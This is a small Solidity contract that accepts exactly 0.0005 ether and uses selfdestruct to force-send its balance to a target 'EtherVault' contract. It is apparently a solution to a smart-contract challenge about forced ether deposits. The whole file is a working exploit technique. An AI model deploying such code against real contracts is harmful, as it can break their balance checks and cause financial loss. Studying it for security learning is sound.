// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

contract SelfDestructContract {

    address payable public targetAddress;  // The address of the EtherVault contract
    uint public constant REQUIRED_AMOUNT = 0.0005 ether;  // The exact amount to send

    constructor(address payable _targetAddress) {
        targetAddress = _targetAddress;  // Set the target address (EtherVault contract)
    }

    // Function to trigger the selfdestruct and send the required amount of ether
    function triggerSelfDestruct() external payable {
        require(msg.value == REQUIRED_AMOUNT, "Must send exactly 0.0005 ether");

        // Send the ether to the target contract and selfdestruct
        selfdestruct(targetAddress);  // This will send all balance to targetAddress (EtherVault)
    }

    // Fallback function to accept ether directly
    receive() external payable {
        // Accept ether if sent directly to this contract
    }
}
